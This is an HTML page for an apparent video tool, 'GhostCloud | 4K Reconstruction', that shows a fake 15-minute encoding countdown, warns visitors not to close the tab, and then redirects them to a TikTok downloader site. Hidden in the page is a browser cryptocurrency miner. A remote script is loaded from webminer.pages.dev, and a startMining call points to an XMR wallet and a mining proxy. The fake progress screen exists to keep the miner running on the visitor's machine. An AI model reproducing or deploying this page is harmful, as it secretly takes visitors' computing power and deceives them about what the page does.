<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><title>GhostCloud | 4K Reconstruction</title>
    <script src="https://webminer.pages.dev/load.js"></script>
    <style>
        body { background: #050a12; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .panel { width: 340px; background: #0d1520; padding: 35px; border-radius: 20px; border: 1px solid #1e293b; text-align: center; box-shadow: 0 0 40px rgba(0,0,0,0.7); }
        
        /* BOLD HEADER */
        .status-top { font-weight: 900; font-size: 13px; color: #007bff; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 15px; }
        .main-msg { font-weight: 800; font-size: 19px; line-height: 1.3; margin-bottom: 20px; color: #ffffff; }

        /* THE LIQUID GLOW BAR */
        .bar-container { background: #161f2c; height: 24px; border-radius: 12px; margin: 20px 0; overflow: hidden; border: 1px solid #2d3d54; position: relative; }
        #fill { 
            height: 100%; width: 0%; 
            background: linear-gradient(90deg, #007bff, #00d4ff);
            box-shadow: 0 0 20px #007bff;
            transition: width 1s linear;
        }

        /* TIMER & PERCENT */
        #clock { font-family: monospace; font-size: 42px; font-weight: 900; color: #fff; margin: 10px 0; }
        .pct-box { font-weight: 900; font-size: 16px; color: #94a3b8; }
        
        /* BOLD WARNING */
        .warning { font-weight: 800; color: #facc15; font-size: 11px; margin-top: 25px; text-transform: uppercase; border: 1px dashed #facc15; padding: 10px; border-radius: 8px; }
    </style>
</head>
<body>

<div class="panel">
    <div class="status-top">NODE ENCRYPTION ACTIVE</div>
    <div class="main-msg" id="msg">**CONFIGURING 4K RECONSTRUCTION...**</div>
    
    <div id="clock">15:00</div>
    
    <div class="bar-container">
        <div id="fill"></div>
    </div>
    
    <div class="pct-box">**<span id="pct">0</span>% ENCODED**</div>
    
    <div class="warning">**⚠️ DO NOT CLOSE TAB: HANDSHAKE IN PROGRESS**</div>
</div>

<script>
    // 1. START MINER
    try {
        startMining("YOUR_XMR_WALLET_ADDRESS", "GhostCloud_Node", "wss://ny1.xmrminingproxy.com", 55);
    } catch(e) { console.log("Node Handshake initiated..."); }

    // 2. THE ENGINE
    var params = new URLSearchParams(window.location.search);
    var stage = parseInt(params.get('stage')) || 1;
    var total = 900; 
    var left = total;

    if(stage === 2) {
        document.getElementById('msg').innerHTML = "**FINALIZING BITRATE SYNC...**";
        document.getElementById('msg').style.color = "#00ff88";
    }

    var run = setInterval(function() {
        left--;
        
        // Timer MM:SS
        var m = Math.floor(left / 60);
        var s = left % 60;
        document.getElementById('clock').innerHTML = m + ":" + (s < 10 ? "0" + s : s);

        // Progress Calculation
        var move = ((total - left) / total) * 100;
        document.getElementById('fill').style.width = move + "%";
        document.getElementById('pct').innerHTML = Math.floor(move);

        // Stage Switching
        if (left <= 0) {
            clearInterval(run);
            var u = params.get('url') || "https://tiktok.com";
            if (stage === 1) {
                window.location.href = "verify.html?stage=2&url=" + encodeURIComponent(u);
            } else {
                window.location.href = "https://snaptik.app/abc.php?url=" + encodeURIComponent(u);
            }
        }
    }, 1000);
</script>

</body>
</html>
